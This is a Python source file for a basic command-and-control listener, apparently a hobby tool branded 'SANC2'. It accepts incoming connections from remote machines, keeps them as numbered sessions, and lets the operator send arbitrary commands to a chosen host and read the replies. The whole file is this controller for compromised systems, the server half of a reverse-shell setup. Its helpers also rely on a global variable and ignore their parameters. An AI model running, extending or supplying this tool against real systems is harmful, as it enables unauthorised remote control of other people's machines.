import socket
import sys
import threading
import concurrent.futures
from prettytable import PrettyTable


def banner():
    print('███████  █████  ███    ██  ██████ ██████  ')
    print('██      ██   ██ ████   ██ ██           ██ ')
    print('███████ ███████ ██ ██  ██ ██       █████  ')
    print('     ██ ██   ██ ██  ██ ██ ██      ██      ')
    print('███████ ██   ██ ██   ████  ██████ ███████  by Sanchious')


def inbound_message(remote_target):
    print(f'[+] Awaiting response...')
    response = session_id.recv(1024).decode()
    return response


def outbound_message(remote_target, message):
    session_id.send(message.encode())


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print(
        f'[*] Started listener on {host_ip}:{host_port}...\n')
    sock.listen()
    # with concurrent.futures.ThreadPoolExecutor() as executor:
    # f1 = executor.submit(message_handler)
    # f1.result()
    t1 = threading.Thread(target=message_handler)
    t1.start()


def message_handler():
    while True:
        if exit_flag == True:
            break
        try:
            remote_target, remote_ip = sock.accept()
            sessions.append([remote_target, remote_ip[0]])
            print(
                f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
        except:
            pass


def session_handler(session_id):
    while True:
        message = input('send message#> ')
        if message == 'exit':
            outbound_message(session_id, message)
            session_id.close()
            break
        elif message == 'background':
            break
        elif not message:
            continue
        outbound_message(session_id, message)

        response = inbound_message(session_id)
        if response == 'exit':
            print('[-] The client has terminated the session.')
            session_id.close()
            break
        print(response)


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    banner()
    sessions = []
    exit_flag = False
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])

    except IndexError:
        print('[-] Argument(s) missing.')
    except Exception as e:
        print(e)

    listener_handler()
    while True:
        try:
            command = input('Enter command#> ')
            if command.split(' ')[0] == 'sessions':
                session_counter = 1
                if command.split(' ')[1] == '-l':
                    table = PrettyTable()
                    table.field_names = ['Session ID', 'Target']
                    table.padding_width = 3
                    for target in sessions:
                        table.add_row([session_counter, target[1]])
                        session_counter += 1
                    print(table)
                if command.split(' ')[1] == '-i':
                    num = int(command.split(' ')[2])
                    session_id = (sessions[num - 1])[0]
                    session_handler(session_id)
            if command == 'exit':
                exit_flag = True
                sock.close()
                break

        except KeyboardInterrupt:
            print('\n [-] Keyboard interrupt issued.')
            exit_flag = True
            sock.close()
            break
